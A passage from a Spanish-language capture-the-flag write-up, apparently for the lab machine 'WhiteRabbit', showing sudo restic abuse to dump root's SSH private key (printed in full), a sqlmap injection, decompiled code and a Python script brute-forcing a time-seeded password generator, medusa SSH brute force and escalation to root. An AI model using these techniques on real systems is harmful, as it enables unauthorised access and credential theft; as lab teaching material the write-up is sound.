      --pack-size size             set target pack size in MiB, created pack files may be larger (default: $RESTIC_PACK_SIZE)
      --password-command command   shell command to obtain the repository password from (default: $RESTIC_PASSWORD_COMMAND)
  -p, --password-file file         file to read the repository password from (default: $RESTIC_PASSWORD_FILE)
  -q, --quiet                      do not output comprehensive progress report
  -r, --repo repository            repository to backup to or restore from (default: $RESTIC_REPOSITORY)
      --repository-file file       file to read the repository location from (default: $RESTIC_REPOSITORY_FILE)
      --retry-lock duration        retry to lock the repository if it is already locked, takes a value like 5m or 2h (default: no retries)
      --tls-client-cert file       path to a file containing PEM encoded TLS client certificate and private key (default: $RESTIC_TLS_CLIENT_CERT)
  -v, --verbose                    be verbose (specify multiple times or a level using --verbose=n, max level/times is 2)

Use "restic [command] --help" for more information about a command.
```

Vamos a realizar un backup completo de /root:

```bash
sudo /usr/bin/restic init --repo .

sudo /usr/bin/restic --repo . backup /root/
enter password for repository: 
repository e99baf26 opened (version 2, compression level auto)
created new cache in /root/.cache/restic
no parent snapshot found, will read all files


Files:           4 new,     0 changed,     0 unmodified
Dirs:            3 new,     0 changed,     0 unmodified
Added to the repository: 6.493 KiB (3.603 KiB stored)

processed 4 files, 3.865 KiB in 0:00
snapshot f159e0e2 saved
```

(La contraseña la creamos nosotros). De primeras no vamos a ver nada interesante, debemos listar ahora las snapshots:

```bash
sudo /usr/bin/restic --repo . snapshots
enter password for repository: 
repository e99baf26 opened (version 2, compression level auto)
ID        Time                 Host          Tags        Paths
--------------------------------------------------------------
f159e0e2  2025-11-20 19:57:15  ebdce80611e9              /root
--------------------------------------------------------------
1 snapshots
```

Tenemos una snapshot, vamos a listarla:

```bash
sudo /usr/bin/restic --repo . ls f159e0e2
enter password for repository: 
repository e99baf26 opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
snapshot f159e0e2 of [/root] filtered by [] at 2025-11-20 19:57:15.793714778 +0000 UTC):
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.profile
/root/.ssh
/root/morpheus
/root/morpheus.pub
```

Veo claves, seguramente /root/morpheus es una privada para SSH.

```bash
sudo /usr/bin/restic --repo . dump latest /root/morpheus
enter password for repository: 
repository e99baf26 opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQS/TfMMhsru2K1PsCWvpv3v3Ulz5cBP
UtRd9VW3U6sl0GWb0c9HR5rBMomfZgDSOtnpgv5sdTxGyidz8TqOxb0eAAAAqOeHErTnhx
K0AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+w
Ja+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR
4AAAAhAIUBairunTn6HZU/tHq+7dUjb5nqBF6dz5OOrLnwDaTfAAAADWZseEBibGFja2xp
c3QBAg==
-----END OPENSSH PRIVATE KEY-----
```

---

### 7. Acceso SSH como morpheus (user flag)

Seguramente la clave es para el SSH del puerto 22 con el usuario morpheus. Simplemente copiamos y pegamos la clave privada en nuestra máquina de atacante con permisos `chmod 600 morpheus` y nos conectamos:

```bash
ssh morpheus@10.10.11.63 -i morpheus
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Nov 20 20:05:01 2025 from 10.10.14.214
morpheus@whiterabbit:~$ cat user.txt  
```

Ya tenemos la **user flag**.

---

### 8. Análisis del generador de contraseñas

Toca ir a por la root flag. Para escalar privilegios recordemos esta pista clave de la SQL Injection:

```bash
sqlmap -u "http://localhost:8081" \
  --method=POST \
  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
  --headers="Content-Type: application/json" \
  -D temp \
  -T command_log \
  --dump \
  --batch
  
  
  +----+---------------------+------------------------------------------------------------------------------+
| id | date                | command                                                                      |
+----+---------------------+------------------------------------------------------------------------------+
| 1  | 2024-08-30 10:44:01 | uname -a                                                                     |
| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |
| 3  | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd                       |
| 4  | 2024-08-30 11:59:02 | rm -rf .bash_history                                                         |
| 5  | 2024-08-30 11:59:47 | #thatwasclose                                                                |
| 6  | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd |
+----+---------------------+------------------------------------------------------------------------------+
```

Este binario `/opt/neo-password-generator/neo-password-generator` tiene pinta interesante.

```bash
morpheus@whiterabbit:/$ /opt/neo-password-generator/neo-password-generator
YGQlQ071f0VPb53IUGVH
```

Veo este output que no sé para que sirve, si trato de hacer un cat al binario veo texto ilegible. Tocará mandar el binario a nuestra máquina de atacante y examinarlo con **ghidra**:

Vamos a mirar las funciones **generate_password** y **main**:

Abrimos el proyecto y le vamos a analizar el binario (marcamos **select all** en la herramienta), después de hacerlo deberiamos poder ver el código de dichas funciones:

Función generate_password:

```c

void generate_password(uint param_1)

{
  int iVar1;
  long in_FS_OFFSET;
  int local_34;
  char local_28 [20];
  undefined1 local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  srand(param_1);
  for (local_34 = 0; local_34 < 0x14; local_34 = local_34 + 1) {
    iVar1 = rand();
    local_28[local_34] =
         "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[iVar1 % 0x3e];
  }
  local_14 = 0;
  puts(local_28);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

Función main:

```c

undefined8 main(void)

{
  long in_FS_OFFSET;
  timeval local_28;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  gettimeofday(&local_28,(__timezone_ptr_t)0x0);
  generate_password((int)local_28.tv_sec * 1000 + (int)(local_28.tv_usec / 1000));
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

```

Le vamos a pasar a la IA este prompt: `Creame un script en python que me cree el diccionario con todas las posibles contraseñas en el momento de ejecución: 2024-08-30 14:40:42`. (El momento de ejecución está en el SQL Injection).

Esto sirve para averiguar el milisegundo exacto en el que se generó la contraseña, en la SQL Injection solo tenemos hasta los segundos, necesitamos bruteforcear los 1000 milisegundos posibles para averiguar la contraseña exacta para el usuario neo. Resumidamente el generador de contraseñas genera una dependiendo de la fecha y hora (incluyendo milisegundos) en el que se haya ejecutado, **no es aleatorio**, es un **time-based pseudo-random number generator**.

```python
from ctypes import CDLL
import datetime

# Carga la librería estándar de C para usar srand() y rand()
libc = CDLL("libc.so.6")

# Timestamp del momento exacto (2024-08-30 14:40:42 UTC)
# cuando se SUPONE que se generó la contraseña real (Obtenido de la base de datos)
seconds = datetime.datetime(2024, 8, 30, 14, 40, 42, 
           tzinfo=datetime.timezone(datetime.timedelta(0))).timestamp()

# Prueba 1000 posibilidades de microsegundos (0-999)
for i in range(0,1000):
    password = ""  # Reinicia la contraseña
    
    # Calcula la semilla POTENCIAL usada en ese momento
    # int(timestamp_en_ms + microsegundos)
    microseconds = i
    current_seed_value = int(seconds * 1000 + microseconds)
    
    # Inicializa el generador de números aleatorios de C con esa semilla
    libc.srand(current_seed_value)
    
    # Genera 20 caracteres de contraseña
    for j in range(0,20):
        # Obtiene un número pseudoaleatorio (0 a RAND_MAX)
        rand_int = libc.rand()
        
        # Mapea el número a un charset: a-zA-Z0-9 (62 caracteres)
        char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        password += char_set[rand_int % 62]  # Usa módulo para indexar
    
    print(password)
```

Para ejecutarlo: `python3 exploit.py > passwords.txt`

---

### 9. Bruteforce SSH del usuario neo

Ahora con el diccionario que nos ha creado el script de python bruteforceo el ssh del usuario neo, lo haré con la herramienta **medusa**.

```bash
medusa -h 10.10.11.63 -u neo -P /home/abra/htb_machines/WhiteRabbit/passwords.txt -M ssh -t 6 -f

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ssh] Host: 10.10.11.63 (1 of 1, 0 complete) User: neo (1 of 1, 0 complete) Password: cOBXPQDByTiWBDDEYJXK (1 of 1000 complete)
ACCOUNT CHECK: [ssh] Host: 10.10.11.63 (1 of 1, 0 complete) User: neo (1 of 1, 0 complete) Password: XSfLZ30sr8sjDJbx8geU (2 of 1000 complete)
ACCOUNT CHECK: [ssh] Host: 10.10.11.63 (1 of 1, 0 complete) User: neo (1 of 1, 0 complete) Password: L7Qf2aFEohexxuk07tEw (3 of 1000 complete)
ACCOUNT CHECK: [ssh] Host: 10.10.11.63 (1 of 1, 0 complete) User: neo (1 of 1, 0 complete) Password: lWL7jrjJTC54qDojrCvV (4 of 1000 complete)
ACCOUNT CHECK: [ssh] Host: 10.10.11.63 (1 of 1, 0 complete) User: neo (1 of 1, 0 complete) Password: hN6DEuEFtQ5LZX8uxw9r (5 of 1000 complete)
ACCOUNT CHECK: [ssh] Host: 10.10.11.63 (1 of 1, 0 complete) User: neo (1 of 1, 0 complete) Password: mnQ1II9iyvPJRhLBMVfB (6 of 1000 complete)
ACCOUNT CHECK: [ssh] Host: 10.10.11.63 (1 of 1, 0 complete) User: neo (1 of 1, 0 complete) Password: R4njydUwbk3uML4yVoT9 (7 of 1000 complete)

...

ACCOUNT CHECK: [ssh] Host: 10.10.11.63 (1 of 1, 0 complete) User: neo (1 of 1, 0 complete) Password: bYsUiYmZUCEfmKFT82fC (29 of 1000 complete)
ACCOUNT CHECK: [ssh] Host: 10.10.11.63 (1 of 1, 0 complete) User: neo (1 of 1, 0 complete) Password: qL15rgn2aaQJJLcmitXZ (30 of 1000 complete)
ACCOUNT CHECK: [ssh] Host: 10.10.11.63 (1 of 1, 0 complete) User: neo (1 of 1, 0 complete) Password: WBSxhWgfnMiclrV4dqfj (31 of 1000 complete)


ACCOUNT FOUND: [ssh] Host: 10.10.11.63 User: neo Password: WBSxhWgfnMiclrV4dqfj [SUCCESS]
```

Tenemos credenciales: `neo:WBSxhWgfnMiclrV4dqfj`

---

### 10. Escalada de privilegios a root

Bueno, la escalada de privilegios es demasiado sencilla, **sudo su** con el usuario neo y listo.

```bash
neo@whiterabbit:~$ sudo -l
[sudo] password for neo: 
Matching Defaults entries for neo on whiterabbit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User neo may run the following commands on whiterabbit:
    (ALL : ALL) ALL
neo@whiterabbit:~$ sudo su
root@whiterabbit:/home/neo# 
```